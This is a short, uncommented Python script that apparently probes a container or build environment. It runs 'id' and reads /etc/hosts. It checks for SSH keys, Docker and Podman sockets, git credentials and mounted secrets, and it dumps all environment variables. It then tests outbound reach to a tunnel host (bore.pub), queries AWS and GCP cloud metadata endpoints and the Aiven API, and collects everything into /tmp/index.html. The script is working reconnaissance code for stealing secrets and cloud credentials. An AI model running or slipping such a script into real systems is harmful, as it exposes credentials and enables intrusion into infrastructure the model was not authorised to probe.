import os,socket,subprocess,urllib.request,sys
def sh(c):
    try: return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=15).stdout.strip()
    except Exception as e: return "ERR "+str(e)
def get(u,t=8):
    try:
        r=urllib.request.urlopen(u,timeout=t); return "%s %s"%(r.status,r.read(400).decode('utf8','replace').replace('\n',' '))
    except Exception as e: return "FAIL "+type(e).__name__+" "+str(e)[:200]
out=[]
out.append("=== id ===\n"+sh("id"))
out.append("=== hosts ===\n"+open('/etc/hosts').read())
out.append("=== secrets scan ===")
for p in ['/run/secrets','/var/run/secrets','/root/.ssh','/root/.docker','/var/run/docker.sock','/run/podman/podman.sock','/.git-credentials','/root/.gitconfig','/etc/hostname','/etc/machine-id']:
    out.append(p+" -> "+("EXISTS: "+sh("ls -la "+p+" 2>&1 | head -5") if os.path.exists(p) else "absent"))
out.append("=== root listing ===\n"+sh("ls -la /"))
out.append("=== env ===\n"+sh("env | sort"))
out.append("=== egress bore ===\n"+get("http://bore.pub:24750/build-egress"))
out.append("=== egress ip ===\n"+get("https://ifconfig.me"))
out.append("=== metadata 169.254.169.254 ===\n"+get("http://169.254.169.254/latest/meta-data/"))
out.append("=== metadata gcp ===\n"+get("http://metadata.google.internal/computeMetadata/v1/",5))
out.append("=== dns 169.254.1.1 ===\n"+sh("getent hosts 169.254.1.1"))
out.append("=== aiven api reach ===\n"+get("https://api.aiven.io/v1/me"))
open('/tmp/index.html','w').write("\n\n".join(out))
print("done")
